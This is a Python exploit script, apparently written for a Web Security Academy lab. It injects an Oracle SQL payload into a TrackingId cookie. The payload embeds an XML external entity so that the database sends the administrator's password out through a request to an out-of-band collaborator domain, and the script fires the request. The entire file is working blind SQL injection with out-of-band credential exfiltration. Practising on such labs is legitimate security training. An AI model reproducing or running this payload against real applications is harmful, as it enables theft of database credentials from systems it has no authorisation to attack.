import requests
from urllib.parse import quote

url = "https://0a1500e203dab33f808a4976000f00bf.web-security-academy.net/"
session = "tKjoXM2GnC3eMU7ZaCims0BILy1QDTVa"
tracking_id = "ohuDdIKkVL8htkw4"
colloborator_domain = "vthdfgizsddhocpiqubyho9zcnk4esfr9.oast.fun"



# Helper Functions
def build_payload():
    """
    Builds the TrackingId cookie payload:
    x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml...'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR...'),'/l')+FROM+dual--
    """
    password_query = "(SELECT password FROM users WHERE username='administrator')"
    url_for_xxe = f"http://'||{password_query}||'.{colloborator_domain}/"
    xml_entity = f'<!DOCTYPE root [<!ENTITY % remote SYSTEM "{url_for_xxe}"> %remote;]>'
    xml_string = f'<?xml version="1.0" encoding="UTF-8"?>{xml_entity}'
    encoded_xml = quote(xml_string, safe='')
    payload = f"x'+UNION+SELECT+EXTRACTVALUE(xmltype('{encoded_xml}'),'/l')+FROM+dual--"
    return payload

def send_malicious_request():
    tracking_id_value = build_payload()
    cookies = {
        "TrackingId": tracking_id_value,
        "session": session
    }
    print("[*] Sending OOB exfiltration payload...")
    print(f"[*] Using Collaborator domain: {colloborator_domain}")
    resp = requests.get(url, cookies=cookies, timeout=10)
    print(f"[+] HTTP status code: {resp.status_code}")
    print("[*] Now go to Burp Collaborator tab and click 'Poll now'.")

if __name__ == "__main__":
    if "your-collaborator-domain" in colloborator_domain:
        print("[-] Please replace COLLABORATOR_DOMAIN with your actual Burp Collaborator domain.")
    else:
        send_malicious_request()